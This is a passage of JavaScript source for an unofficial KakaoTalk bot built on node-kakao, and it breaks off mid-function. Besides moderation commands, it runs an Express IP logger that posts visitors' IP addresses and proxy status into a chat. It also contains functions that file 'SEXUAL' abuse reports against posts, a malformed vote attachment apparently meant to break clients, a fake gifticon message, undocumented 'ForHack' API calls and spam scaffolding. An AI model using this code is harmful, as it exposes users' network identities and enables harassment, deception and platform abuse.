//해당 코드는 임지혁으로부터 제작되었습니다.
"use strict";
var __createBinding =
  (this && this.__createBinding) ||
  (Object.create
    ? function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        Object.defineProperty(o, k2, {
          enumerable: true,
          get: function () {
            return m[k];
          },
        });
      }
    : function (o, m, k, k2) {
        if (k2 === undefined) k2 = k;
        o[k2] = m[k];
      });
var __setModuleDefault =
  (this && this.__setModuleDefault) ||
  (Object.create
    ? function (o, v) {
        Object.defineProperty(o, "default", { enumerable: true, value: v });
      }
    : function (o, v) {
        o["default"] = v;
      });
var __importStar =
  (this && this.__importStar) ||
  function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null)
      for (var k in mod)
        if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k))
          __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
  };
var __importDefault =
  (this && this.__importDefault) ||
  function (mod) {
    return mod && mod.__esModule ? mod : { default: mod };
  };
var fs = require("fs");
const {
  ChatBuilder,
  MentionContent,
  KnownChatType,
  AttachmentContent,
  KnownChannelMetaType,
} = require("node-kakao");
function _typeof(obj) {
  if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") {
    _typeof = function _typeof(obj) {
      return typeof obj;
    };
  } else {
    _typeof = function _typeof(obj) {
      return obj &&
        typeof Symbol === "function" &&
        obj.constructor === Symbol &&
        obj !== Symbol.prototype
        ? "symbol"
        : typeof obj;
    };
  }
  return _typeof(obj);
}
let ipchannel;
let ip_bool = false;
let nodemailer = require("nodemailer");
let smtpTransport = require("nodemailer-smtp-transport");
let transporter = nodemailer.createTransport(
  smtpTransport({
    service: "gmail",
    host: "smtp.gmail.com",
    auth: {
      user: process.env.EMAIL,
      pass: process.env.PASS,
    },
  })
);
//필요 시 이메일 변경 가능
//이메일 보안 설정 필요
const fetch = require("node-fetch");
const JSEncrypt = require("jsencrypt");
const readline = require("readline");
const Timetable = require("comcigan-parser");
const timetable = new Timetable();
const request = require("request");
const login_info = __importStar(require("./INFO/account.json"));
const node_kakao = require("node-kakao");
const crypto = __importDefault(require("crypto"));
const { prefix, email, pw, deviceName, deviceUUID } = login_info["j"]; //계정 선택
const client = new node_kakao.TalkClient();
const startTime = new Date();
const getInfo2 = __importStar(require("./INFO/client.json"));
const captcha = require("nodejs-captcha");
let { ver, kakaoVer, lastUpdate, topAdmin } = getInfo2;
let adminList = __importStar(require("./INFO/adminList.json")).adminList;
let cartifiInfo = {
  waiting: false,
  key: "",
};
let banroom = ["332399725649150"];
let allsee = "\u200b".repeat(500);
let spamInterval;
let speedSpamInterval;
let runningSSPam = false;
let runningSpam = false;
function pausecomp(millis) {
  var date = new Date();
  var curDate = null;
  do {
    curDate = new Date();
  } while (curDate - date < millis);
}
function encryptData(data) {
  const jsEncrypt = new JSEncrypt();
  jsEncrypt.setPublicKey(
    "30820122300d06092a864886f70d01010105000382010f003082010a0282010100f357429c22add0d547ee3e4e876f921a0114d1aaa2e6eeac6177a6a2e2565ce9593b78ea0ec1d8335a9f12356f08e99ea0c3455d849774d85f954ee68d63fc8d6526918210f28dc51aa333b0c4cdc6bf9b029d1c50b5aef5e626c9c8c9c16231c41eef530be91143627205bbbf99c2c261791d2df71e69fbc83cdc7e37c1b3df4ae71244a691c6d2a73eab7617c713e9c193484459f45adc6dd0cba1d54f1abef5b2c34dee43fc0c067ce1c140bc4f81b935c94b116cce404c5b438a0395906ff0133f5b1c6e3b2bb423c6c350376eb4939f44461164195acc51ef44a34d4100f6a837e3473e3ce2e16cedbe67ca48da301f64fc4240b878c9cc6b3d30c316b50203010001"
  );
  return jsEncrypt.encrypt(data);
}
let session_info;
let SessionWebClient;
let axios = require("axios");
var accountUserId, gggg_ID, gggg_R_TOKEN, gggg_TOKEN;
async function login() {
  const api = await node_kakao.AuthApiClient.create(deviceName, deviceUUID);
  const form = {
    email: email,
    password: pw,
    forced: true,
  };
  let loginRes = await api.login(form, 1);
  session_info = `${loginRes.result.accessToken}-${loginRes.result.deviceUUID}`;
  SessionWebClient = await node_kakao.api.createSessionWebClient(
    loginRes.result,
    {
      locoBookingHost: "booking-loco.kakao.com",
      locoBookingPort: 443,

      locoPEMPublicKey: `-----BEGIN PUBLIC KEY-----\nMIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEApElgRBx+g7sniYFW7LE8ivrwXShKTRFV8lXNItMXbN5QSC8vJ/cTSOTS619Xv5Zx7xXJIk4EKxtWesEGbgZpEUP2xQ+IeH9oz0JxayEMvvD1nVNAWgpWE4pociEoArsK7qY3YwXb1CiDHo9hojLv7djbo3cwXvlyMh4TUrX2RjCZPlVJxk/LVjzcl9ohJLkl3eoSrf0AE4kQ9mk3+raEhq5Dv+IDxKYX+fIytUWKmrQJusjtre9oVUX5sBOYZ0dzez/XapusEhUWImmB6mciVXfRXQ8IK4IH6vfNyxMSOTfLEhRYN2SMLzplAYFiMV536tLS3VmG5GJRdkpDubqPeQIBAw==\n-----END PUBLIC KEY-----`,

      agent: "win32",

      version: "3.2.3",
      appVersion: "3.2.3.2698",

      osVersion: "10.0",

      deviceType: 2,

      netType: 0,

      mccmnc: "999",

      countryIso: "KR",
      language: "ko",

      subDevice: true,
      deviceModel: "",

      loginTokenSeedList: ["PITT", "INORAN"],
    },
    "https",
    "katalk.kakao.com"
  );
  if (!loginRes.success) {
    if (loginRes.status == -100) {
      loginRes = null;
      console.log("\n   >> REQUESTING PASSCODE..");
      const passcodeRes = await api.requestPasscode(form);
      if (!passcodeRes.success) {
        console.log("   >> ERROR: " + passcodeRes.status);
      } else {
        let rl = readline.createInterface({
          input: process.stdin,
          output: process.stdout,
        });
        let passcode = await new Promise((resolve) =>
          rl.question("   PASSCODE: ", resolve)
        ); //원본코드 new 앞에 yield
        rl.close();
        const registerRes = await api.registerDevice(form, passcode, true);
        if (!registerRes.success) {
          console.log("   >> ERROR: " + registerRes.status);
        } else {
          console.log("   >> DEVICE '" + deviceUUID + "' REGISTERED");
          loginRes = await api.login(form);
          if (!loginRes.success) {
            console.log(
              "   >> LOGIN FAILED. ERROR: " +
                loginRes.status +
                "\n   >> PROCCESS DOWN"
            );
          } else {
            console.log("\n   >> LOGIN SUCCESS");
          }
        }
      }
    } else {
      console.log("   >> ERROR: " + loginRes.status + "\n   >> PROCCESS DOWN");
      process.exit();
    }
  }
  var res = await client.login(loginRes.result);
  accountUserId = loginRes.result.userId;
  gggg_ID = loginRes.result.accountId;
  gggg_TOKEN = loginRes.result.accessToken;
  gggg_R_TOKEN = loginRes.result.refreshToken;
  if (res.success) {
    console.log(
      "\n*********************************APP 정보*********************************",
      "\n   NODE KAKAO VERSION: " + kakaoVer,
      "\n   CLIENT VERSION: " + ver,
      "\n   LAST UPDATE: " + lastUpdate,
      "\n   RESULT: "
    );
    console.log(loginRes.result);
    console.log(
      "\n*************************************************************************",
      "\n",
      "\n"
    );
  } else {
    console.log("LOGIN FAILED! ERROR: " + res.status);
  }
}
login().then();
const express = require("express");
const app = express();
let ipList = []; //이미 추적된 아이피 제외
let myIp = []; //자기 아이피 제외
async function proxyCheck(ip) {
  let res = await axios.get(`https://proxycheck.io/v2/${ip}`);
  return res.data;
}
let { UltimateTextToImage } = require("ultimate-text-to-image");
const detectUser = [];
let randomPath = crypto.default.randomBytes(4).toString("base64");
app.get(`/*`, function (req, res) {
  let notFiltedIp =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  let ip = notFiltedIp.replace("::ffff:", "");
  const ipImage = new UltimateTextToImage(ip, {
    width: 500,
    height: 100,
    fontSize: 72,
  }).render();
  res.setHeader("Content-Type", "image/png");
  const buffer = ipImage.toBuffer("image/png");
  res.end(buffer, "binary");
  if (!ip_bool || ipList.includes(ip) || myIp.includes(ip)) return;
  proxyCheck(ip).then((data) => {
    if (data.status == "ok") {
      if (data[ip].type == "Business") {
        ipchannel.sendChat(`[ IP ] ${ip}`);
      } else if (data[ip].type == "Wireless") {
        ipchannel.sendChat(`[ IP ] ${ip} **WIRELESS**`);
      } else if (data[ip].type == "Hosting") {
        ipchannel.sendChat(`[ IP ] ${ip} **HOSTING**`);
      } else if (data[ip].proxy == "yes") {
        ipchannel.sendChat(`[ IP ] ${ip} **PROXY**`);
      } else {
        ipchannel.sendChat(`[ IP ] ${ip} **UNKNOWN** => ${data[ip].type}`);
      }
    } else {
      ipchannel.sendChat(`[ IP ] ${ip} **CANNOT CHECK**`);
    }
  });
  ipList.push(ip);
});
const port = "8080"; //아이피로거 포트
app.listen(port, function () {});
console.log(`\n\n  >> Express server started at port ${port}\n\n`);
client.on("push_packet", (method, data) => {
  // if (method == "DECUNREAD" || method == "MSG") return;
  // console.log(method);
  // console.log(data);
  // console.log("--------------------");
  if (method == "INVOICE") {
    let invoice_channel = client.channelList.get(data.c);
    let invoice_url = data.k.split("/");
    invoice_url.shift();
    invoice_channel.sendChat(
      `[ INVOICE ] 누군가가 파일을 보내려합니다.${allsee}\nLINK : http://dn-m.talk.kakao.com/talkm/${invoice_url.join(
        "/"
      )}\nSIZE : ${Math.floor(data.s / 1024)}KB`
    );
  }
});
async function chatInfo(channel, id) {
  const chat_info = await channel.chatListStore.get(id);
  return chat_info;
}
function unixTime(t) {
  var date = new Date(t * 1000);
  var year = date.getFullYear();
  var month = "0" + (date.getMonth() + 1);
  var day = "0" + date.getDate();
  var hour = "0" + date.getHours();
  var minute = "0" + date.getMinutes();
  var second = "0" + date.getSeconds();
  return (
    year +
    "-" +
    month.substr(-2) +
    "-" +
    day.substr(-2) +
    " " +
    hour.substr(-2) +
    ":" +
    minute.substr(-2) +
    ":" +
    second.substr(-2)
  );
}
async function isKorean(channelId, userId) {
  try {
    await request({
      uri: "https://gift-talk.kakao.com",
      method: "POST",
      form: {
        "x-kc-adid": "00000000-0000-0000-0000-000000000000",
        agent: "aW9zLjE0LjcuMTo5LjQuNzoxMTI1eDI0MzY6aVBob25lOmlvcy4xNC43LjE%3D",
        session_info: session_info,
        chat_id: channelId?.toString(),
        billingReferer: "talk_chatroom_plusbtn",
        input_channel_id: "1926",
      },
      followAllRedirects: true,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 KAKAOTALK 9.4.7",
        "Content-Type": "application/x-www-form-urlencoded",
      },
      resolveWithFullResponse: true,
    });

    const response = await request({
      uri: "https://gift.kakao.com/a/v2/session/receivers",
      method: "POST",
      json: [{ serviceUserId: userId?.toString() }],
    });

    return response.validReceivers.length > 0;
  } catch (e) {
    // 오류났을경우 혹시 모르니 일단 한국인인걸로..
    console.log(e);
    return true;
  }
}
const linkIdForHack = process.env.LINK_ID_FOR_HACK; //관련 함수 대부분 막힘
async function setPost(channelId, text, notice = true) {
  const body = `content=${encodeURI(
    `[{"text":"${text}","type":"text"}]`
  )}&object_type=TEXT&notice=${notice}`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    A: "android/9.4.2/ko",
    Authorization: session_info,
  };
  let res = await axios
    .post(`https://talkmoim-api.kakao.com/chats/${channelId}/posts`, body, {
      headers: headers,
    })
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function getOpenNoticeList(channel) {
  let res = await axios
    .get(
      `https://open.kakao.com/moim/chats/${channel.channelId}/posts?link_id=${linkIdForHack}&type=NOTICE`,
      {
        headers: {
          A: "android/9.4.2/ko",
          Authorization: session_info,
        },
      }
    )
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function pinNotice(channel, pin) {
  let res = await channel.setMeta(6, `{\"pin_notice\":${pin}}`);
  return res;
}
async function unSetNotice(postId, linkId) {
  let res = await axios.post(
    `https://open.kakao.com/moim/posts/${postId}/unset_notice?link_id=${linkId}`,
    {},
    {
      headers: {
        A: "android/9.4.2/ko",
        Authorization: session_info,
      },
    }
  );
  return res.data;
}
async function deletePost(postId, linkId) {
  let res = await axios.delete(
    `https://open.kakao.com/moim/posts/${postId}?link_id=${linkId}`,
    {
      headers: {
        A: "android/9.8.0/ko",
        Authorization: session_info,
      },
    }
  );
  return res.data;
}
async function setOpenPost(channelId, text, notice = true) {
  const body = `content=${encodeURI(
    `[{"text":"${text}","type":"text"}]`
  )}&object_type=TEXT&notice=${notice}`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    A: "android/9.4.2/ko",
    Authorization: session_info,
  };
  let res = await axios
    .post(
      `https://open.kakao.com/moim/chats/${channelId}/posts?link_id=${linkIdForHack}`,
      body,
      { headers: headers }
    )
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function delBot(channelId) {
  let res = await axios
    .get(
      `https://open.kakao.com/c/bot/links/${linkIdForHack}/chats/${channelId}/delBot`,
      {
        headers: {
          A: "android/9.4.2/ko",
          Authorization: session_info,
        },
      }
    )
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function addBot(linkId, channelId) {
  let res = await axios
    .get(
      `https://open.kakao.com/c/bot/links/${linkId}/chats/${channelId}/addBot`,
      {
        headers: {
          A: "android/9.4.2/ko",
          Authorization: session_info,
        },
      }
    )
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function reportNotice(postId, linkId) {
  let res = await axios.post(
    `https://open.kakao.com/moim/posts/${postId}/abuse_report?link_id=${linkId}`,
    "report_type=SEXUAL",
    {
      headers: {
        Authorization: session_info,
        A: "android/9.8.0/ko",
        "Content-Type": "application/x-www-form-urlencoded;",
      },
    }
  );
  return res.data;
}
async function setBotAlarm(channelId, text, time) {
  // let botId;
  // Array.from(channel.getAllUserInfo()).forEach((user) => {
  //   if (user.perm == 8) {
  //     botId = user.userId;
  //   }
  // });
  // console.log(botId);
  // if (!botId) return { success: false, message: "봇이 없습니다." };
  let res = await axios.post(
    `http://open-bot.kakao.com/v1/manager/7598532298039282086/alarm`,
    {
      chatId: channelId,
      messageResponse: text,
      cronExpression: time,
    },
    {
      headers: {
        A: "android/9.4.2/ko",
        Authorization: session_info,
      },
    }
  );
  return res.data;
}
function getLongString(obj = undefined) {
  if (
    typeof obj == "object" &&
    obj != null &&
    obj != undefined &&
    JSON.stringify(Object.keys(obj)) != "[]"
  ) {
    for (const key in obj) {
      try {
        if (typeof obj[key] == "object") {
          if (obj[key].low != undefined) {
            obj[key] = String(obj[key]);
          } else {
            obj[key] = getLongString(obj[key]);
          }
        }
      } catch (e) {}
    }
    return obj;
  } else {
    return obj;
  }
}
async function setBotCommand(channel, command, response) {
  let botId;
  Array.from(channel.getAllUserInfo()).forEach((user) => {
    if (user.perm == 8) {
      botId = user.userId;
    }
  });
  if (!botId) return { success: false, message: "봇이 없습니다." };
  let res = await axios
    .post(
      `https://open-bot.kakao.com/v1/manager/${botId}/command`,
      {
        role: "Keyword",
        name: command,
        response: { type: "Text", text: response },
      },
      {
        headers: {
          Authorization: session_info,
        },
      }
    )
    .catch((e) => {
      return e;
    });
  return res.data;
}
async function changeProfile(nickname, profileimage) {
  let changeProfileRes = await axios
    .post(
      `https://katalk.kakao.com/android/profile/update`,
      {
        nickname: nickname,
        profileImage: {
          path: profileimage,
        },
        decoration: [
          {
            itemKind: "Sticker",
            itemId: "523",
            x: 0.43849248,
            y: 0.29668587,
            cx: 0.6126175,
            cy: 0.47081092,
            width: 0.3482501,
            height: 0.3482501,
            rotation: 9.262899,
            parameters: { resourceUrl: "http://xnever.dothome.co.kr/sands/" },
          },
          {
            itemKind: "Banner",
            itemId: "1",
            x: 0.25985506,
            y: 0.25688475,
            cx: 0.41384572,
            cy: 0.33681884,
            width: 0.30798128,
            height: 0.15986815,
            rotation: -18.448458,
            parameters: {
              content: "YOUR IP:",
              snapshotPath: "UkL0C/wmZV5EbQrc/b5DH0ynVSLdL05Ej6AkT6K/item.png",
              snapshotUrl:
                "https://p.kakaocdn.net/talkp/wmZV5EbQrc/b5DH0ynVSLdL05Ej6AkT6K/item.png",
            },
          },
        ],
      },
      {
        headers: {
          "content-type": "application/json; charset=UTF-8",
          A: "android/9.4.2/ko",
          Authorization: session_info,
        },
      }
    )
    .catch(console.log);
  console.log(changeProfileRes.data);
}

function sendRaw(channel, type, text, attach) {
  channel.sendChat(
    new node_kakao.ChatBuilder()
      .text(text)
      .append(new node_kakao.AttachmentContent(attach))
      .build(type)
  );
}

function chunk(arr, size) {
  var i,
    j,
    temparray = [],
    chunk = size;
  for (i = 0, j = arr.length; i < j; i += chunk) {
    temparray.push(arr.slice(i, i + chunk));
  }
  return temparray;
}
let newMember = [];
let newCaptchaValue = [];
let profileChange = false;
let profileInterval = null;
client.on("user_join", (joinLog, channel, user, feed) => {
  if (!channelAlert.includes(String(channel.channelId)));
  if (feed.feedType == KnownFeedType.OPENLINK_JOIN) {
    channel.sendChat(
      `[ ! ] ${user.nickname}님 환영합니다.\nCaptcha 인증을 위해 30초 이내에 입력해주세요.`
    );
    let newCaptcha = captcha();
    channel.sendMedia(KnownChatType.PHOTO, {
      name: "CaptchaImage",
      data: Buffer.from(
        newCaptcha.image.replace("data:image/jpeg;base64,", ""),
        "base64"
      ),
      width: newCaptcha.width,
      height: newCaptcha.height,
    });
    newCaptchaValue.push(newCaptcha.value);
    newMember.push(String(user.userId));
    if (!memberStamp[String(channel.channelId)]) {
      memberStamp[String(channel.channelId)] = [];
    }
    memberStamp[String(channel.channelId)].push([
      "JOIN",
      user.nickname,
      new Date(),
    ]);
    setTimeout(() => {
      if (newMember.includes(String(user.userId))) {
        channel.sendChat(`[ ! ] ${user.nickname}님 인증이 실패하였습니다.`);
        newMember.splice(newMember.indexOf(String(user.userId)), 1);
        newCaptchaValue.splice(newCaptchaValue.indexOf(newCaptcha.value), 1);
        channel.kickUser(user);
      }
    }, 30000);
  }
});
client.on("user_leave", (leftLog, channel, user, feed) => {
  if (!channelAlert.includes(String(channel.channelId)));
  if (feed.feedType != KnownFeedType.OPENLINK_KICKED) {
    channel.sendChat(`[ ! ] ${user.nickname}님이 퇴장하였습니다.`);
    if (!memberStamp[String(channel.channelId)]) {
      memberStamp[String(channel.channelId)] = [];
    }
    memberStamp[String(channel.channelId)].push([
      "LEAVE",
      user.nickname,
      new Date(),
    ]);
  } else if (feed.feedType == KnownFeedType.OPENLINK_KICKED) {
    channel.sendChat(
      `[ ! ] ${user.nickname}님이 ${
        channel.getUserInfo(leftLog.sender).nickname
      }님에 의해 강제퇴장되었습니다.`
    );
    if (!memberStamp[String(channel.channelId)]) {
      memberStamp[String(channel.channelId)] = [];
    }
    memberStamp[String(channel.channelId)].push([
      "KICK",
      user.nickname,
      new Date(),
    ]);
  }
});
let banList = [];
let chattingBanList = [];
let ipLogId;
client.on("chat", (data, channel) => {
  const sender = data.getSenderInfo(channel);
  if (!sender) return;
  console.log(
    channel.getDisplayName() + " | " + sender.nickname + ": " + data.text
  );
  if (banList.includes(String(sender.userId))) return;
  if (banroom.includes(String(channel.channelId))) return;
  async function joinOpenChat(channel, name, link, passcode) {
    let roomdata = await client.channelList.open.getJoinInfo(link);
    if (!roomdata.success)
      return channel.sendChat("[!] 오픈채팅방 정보를 불러올 수 없어요.");
    if (roomdata.result.openLink.type !== 2)
      return channel.sendChat(`[!] 해당 채팅방은 그룹 오픈채팅방이 아니에요.`);
    let result = [];
    Array.from(client.channelList.all()).map((e) =>
      result.push(e.getDisplayName())
    );
    if (result.includes(roomdata.result.openLink.linkName))
      return channel.sendChat(`[!] 이미 들어가 있는 채팅방이에요.`);
    if (passcode == undefined) {
      const joinRoom = await client.channelList.open.joinChannel(
        { linkId: roomdata.result.openLink.linkId },
        { nickname: name }
      );
      if (!joinRoom.success)
        return channel.sendChat(`[!] 채팅방에 입장하던 중 오류가 발생했어요.`);
      else return channel.sendChat(`[!] 성공적으로 입장했어요.`);
    } else {
      const joinRoom2 = await client.channelList.open.joinChannel(
        { linkId: roomdata.result.openLink.linkId },
        { nickname: name, passcode: passcode }
      );
      if (!joinRoom2.success) return console.log(joinRoom2);
      else return channel.sendChat(`[!] 성공적으로 입장했어요.`);
    }
  }
  function sendErrorPhone2() {
    channel.sendChat(
      new node_kakao.ChatBuilder()
        .text("Unknown")
        .append(
          new node_kakao.AttachmentContent({
            subtype: 1,
            voteId: 123,
            title: false,
            os: [
              {
                t: "PH",
                st: "GH",
                tt: false,
                its: [
                  {
                    tt: "나는",
                  },
                  {
                    tt: "원숭",
                  },
                  {
                    tt: "이다",
                  },
                ],
              },
              {
                t: 2,
                st: 4,
                url: "kakaomoim://post?referer=b&chat_id=308561235219220&post_id=v3Ln3cs6u19TsEBOpIB",
              },
            ],
          })
        )
        .build(97)
    );
  }
  if (
    chattingBanList.includes(String(sender.userId)) ||
    (newMember.includes(String(sender.userId)) &&
      !newCaptchaValue.includes(data.text))
  ) {
    setTimeout(() => {
      channel.hideChat(data._chat);
    }, 200);
  }
  async function longText(channel, outtext, intext) {
    try {
      node_kakao.AttachmentApi.upload(
        node_kakao.KnownChatType.TEXT,
        "long",
        intext
      ).then((c) => {
        if (c.success == true) {
          channel.sendChat(
            new node_kakao.ChatBuilder()
              .text(outtext)
              .attachment(c.result)
              .build(node_kakao.KnownChatType.TEXT)
          );
        } else {
          channel.sendChat(JSON.stringify(c));
        }
      });
    } catch (e) {
      console.log(e);
    }
  } //롱텍 막힘 (최신버전 기준)
  function sendkaling(pa1) {
    const options = {
      uri: "https://chatbubble.kakao.com/chatbubble/v1/bot",
      method: "POST",
      body: { url: "kakaobot://share/feed/hakalling", data: pa1 },
      json: true,
      headers: {
        Authorization: session_info,
      },
    };
    request.post(options, function (error, response, body) {
      //callback
      try {
        channel.sendChat(JSON.stringify(body));
        var sor = body["data"];
      } catch (err) {
        return "[ 경고 ] 올바른 소스를 입력하세요";
      }
      if (error) return JSON.stringify(error, null, 3);
      channel
        .sendChat(
          new node_kakao.ChatBuilder()
            .text("Custom")
            .append(new node_kakao.AttachmentContent(sor))
            .build(71)
        )
        .then((x) => {
          return JSON.stringify(x, null, 3);
        });
    });
  }
  if (data.text == prefix + "인증") {
    if (
      !adminList.includes(Number(sender.userId)) &&
      !topAdmin.includes(Number(sender.userId))
    ) {
      cartifiInfo = {
        waiting: true,
        key: crypto.default.randomBytes(3).toString("base64"),
      };
      console.log(
        "[ ! ] 인증: ",
        `${cartifiInfo.key}를 채팅창에 입력해주세요.`
      );
      channel.sendChat(
        new ChatBuilder()
          .text(`[ ! ] 콘솔에 인증 코드를 전송하였습니다.`)
          .build(1)
      );
    } else {
      channel.sendChat(
        new ChatBuilder()
          .text(`[ ! ] 이미 관리자에 등록되어 있습니다.`)
          .build(1)
      );
    }
  }
  KnownChannelMetaType;
  if (data.text == prefix + "ping") {
    let ping_speed = Date.now();
    channel
      .sendChat(new node_kakao.ChatBuilder().text("pong!").build(1))
      .then(() => {
        channel.sendChat(
          "RUNTIME : " + (Date.now() - ping_speed) / 1000 + "초"
        );
      });
  }
  if (
    newCaptchaValue.includes(data.text) &&
    newMember.includes(String(sender.userId))
  ) {
    newMember.splice(newMember.indexOf(String(sender.userId)), 1);
    newCaptchaValue.splice(newCaptchaValue.indexOf(data.text), 1);
    channel.sendChat("[!] 인증이 완료되었습니다.");
  }
  if (data.text.startsWith(prefix + "ㅊ")) {
    //심심이 패킷
    let freeLevel = data.text.replace(prefix + "ㅊ ", "").split(" ")[0];
    let msg = data.text
      .replace(prefix + "ㅊ ", "")
      .split(" ")
      .splice(1)
      .join(" ");
    if (!freeLevel || !msg) {
      channel.sendChat(
        "[ ! ] !ㅊ (수위레벨) (메세지) 와 같은 형식으로 입력해주세요"
      );
      return;
    }
    (async () => {
      let res = await getTalkSet(msg, freeLevel);
      const censored = res.sentence;
      const original = res.origin_sentence;
      const isCensored = censored != original;
      if (res.detail) {
        channel.sendChat(res.detail);
      } else {
        if (channel.info.type == "OM" && channel.linkId) {
          if (isCensored) {
            channel.sendChat(`[ AI ] ${censored} (몇몇 단어가 검열되었습니다)`);
          } else {
            channel.sendChat(`[ AI ] ${censored}`);
          }
        } else {
          channel.sendChat(`[ AI ] ${original}`);
        }
      }
    })();
  }
  if (data.text.startsWith(prefix + "시간표")) {
    let sigan_school = data.text.split(" ")[1];
    let sigan_grade = data.text.split(" ")[2];
    let sigan_class = data.text.split(" ")[3];
    let sigan_day = data.text.split(" ")[4];
    if (sigan_day > 4 || sigan_day < 0) {
      channel.sendChat("[ ! ] 요일은 0~4 중 입력하세요");
      return;
    }
    timetable
      .init()
      .then(() => timetable.search(sigan_school))
      .then((school) => timetable.setSchool(school[0].code))
      .then(() => {
        Promise.all([timetable.getClassTime(), timetable.getTimetable()]).then(
          (res) => {
            if (res[0] == null || res[1] == null) {
              channel.sendChat("[ ! ] 검색결과가 없습니다.");
            } else {
              longText(
                channel,
                `[ ! ] ${sigan_school}의 ${sigan_grade}학년 ${sigan_class}반 ${sigan_day}번째 요일 시간표`,
                `${res[0].join("\n")}\n\n${res[1][sigan_grade][sigan_class][
                  sigan_day
                ]
                  .map((r) => JSON.stringify(r, null, 3))
                  .join("\n")}`
              );
            }
          }
        );
      });
  }
  if (data.text == prefix + "작동") {
    let runtime = new Date() - startTime;
    let runtime_min = Math.floor(runtime / 60000);
    let runtime_sec = Math.floor((runtime % 60000) / 1000);
    channel.sendChat(
      new ChatBuilder()
        .text(
          "[ ! ] 정상 작동 중\n런타임: " +
            runtime_min +
            "분 " +
            runtime_sec +
            "초"
        )
        .build(1)
    );
  }
  if (data.text == cartifiInfo.key && cartifiInfo.waiting == true) {
    try {
      cartifiInfo.waiting = false;
      adminList.push(Number(sender.userId));
      fs.writeFile(
        "./INFO/adminList.json",
        `{"adminList":[${adminList.join()}]}`,
        "utf8",
        function (error) {
          if (error) {
            console.log(error);
          }
        }
      );
      channel.sendChat(
        new ChatBuilder()
          .text("[ ! ] ")
          .append(new MentionContent(sender))
          .text(`님이 관리자에 등록되었습니다`)
          .build(1)
      );
    } catch (err) {
      console.log(err);
    }
  }
  if (
    !adminList.includes(Number(sender.userId)) &&
    !topAdmin.includes(Number(sender.userId))
  )
    return; //어드민이 아닐 시 리턴
  if (data.text.startsWith(prefix + "채팅금지")) {
    data.mentions.forEach((mention) => {
      if (chattingBanList.includes(String(mention.user_id))) {
        channel.sendChat("[ ! ] 이미 금지된 유저는 제외하였습니다");
        return;
      }
      chattingBanList.push(String(mention.user_id));
    });
    channel.sendChat(`[ ! ] ${data.mentions.length}명이 채팅금지 되었습니다`);
  }
  if (data.text == prefix + "채금목록") {
    if (chattingBanList.length == 0) {
      channel.sendChat("[ ! ] 채팅금지한 유저가 없습니다");
      return;
    }
    longText(channel, "[ ! ] 채팅금지 목록", chattingBanList.join("\n"));
  }
  if (data.text.startsWith(prefix + "방링 ")) {
    try {
      var url = data.text.replace(prefix + "방링 ", "");
      let channel2 = client.channelList.get(url);
      channel2
        .getLatestOpenLink()
        .then((r) => {
          channel.sendChat(
            `[ ! ] 해당 방아이디로 추출한 방 링크입니다 : ${r.result.linkURL}`
          );
        })
        .catch((e) => console.log(e));
    } catch (e) {
      channel.sendChat("[ ! ] 들어간 기록이 없는 방입니다");
    }
  }
  if (data.text.startsWith(prefix + "채금해제")) {
    data.mentions.forEach((mention) => {
      chattingBanList.splice(
        chattingBanList.indexOf(String(mention.user_id)),
        1
      );
    });
    channel.sendChat(
      `[ ! ] ${data.mentions.length}명이 채팅금지 해제되었습니다`
    );
  }
  if (data.text == prefix + "리토큰") {
    async function a() {
      var OAuthClient = await node_kakao.OAuthApiClient.create();
      var newTokenRes = await OAuthClient.renew({
        userId: gggg_ID,
        deviceUUID: deviceUUID,
        accessToken: gggg_TOKEN,
        refreshToken: gggg_R_TOKEN,
      });
      if (!newTokenRes.success) {
        console.log("Token Refresh Failed -> " + newTokenRes.status);
        channel.sendChat("실패!\n" + newTokenRes.status);
      } else {
        var res = newTokenRes.result;
        console.log("OAuth renew success");
        console.log(
          `ExpiresIn: ${res.expiresIn}, type: ${res.type}, accessToken: ${res.credential.accessToken}`
        );
        session_info = `${res.credential.accessToken}-${deviceUUID}`;
        console.log(`new Token : ${session_info}`);
        channel.sendChat("토큰을 재발급했습니다!");
      }
    }
    a();
  }
  if (
    data.text == prefix + "답장강퇴" &&
    data.originalType == KnownChatType.REPLY
  ) {
    try {
      channel.kickUser(
        channel.getUserInfo({ userId: data._chat.attachment.src_userId })
      );
    } catch (err) {
      console.log(err);
      channel.sendChat("[ ! ] 강퇴에 실패하였습니다");
    }
  }
  if (
    data.text.startsWith(prefix + "강퇴") &&
    data.text.charAt(3) != "목" &&
    data.text.charAt(3) != "해"
  ) {
    data.mentions.forEach((v, i) => {
      try {
        channel.kickUser(channel.getUserInfo({ userId: v.user_id }));
        pausecomp(110);
      } catch (err) {
        channel.sendChat(String(err));
      }
    });
    channel.sendChat("[ ! ] 강퇴 완료");
  }
  if (data.text.startsWith(prefix + "치킨")) {
    let chickenMsg = data.text.replace(prefix + "치킨 ", "");
    channel.sendChat(
      new node_kakao.ChatBuilder()
        .append(
          new node_kakao.AttachmentContent({
            L: "",
            Q: "기프티콘",
            V: "brand",
            R: [
              {
                D: "",
                L: "",
                DE: "",
                I: "http://file3.instiz.net/data/cached_img/upload/2018/06/12/22/56a307753acbdaa2c812e2dd7af38113.jpg",
                T: "선물과 메시지를 보냈습니다!",
                W: "800",
                H: "797",
              },
            ],
            F: {
              BU: [
                {
                  T: "선물함으로 가기",
                  L:
                    "kakaoplus://plusfriend/talk/bot/@limgehtest/" + chickenMsg, //카카오채널 of 임지혁
                },
              ],
            },
          })
        )
        .build(23)
    );
  }
  if (data.text == prefix + "채널리스트") {
    try {
      let listName = [];
      let listId = [];
      Array.from(client.channelList.all()).map((e) => {
        listName.push(e.getDisplayName());
        listId.push(e.channelId);
      });
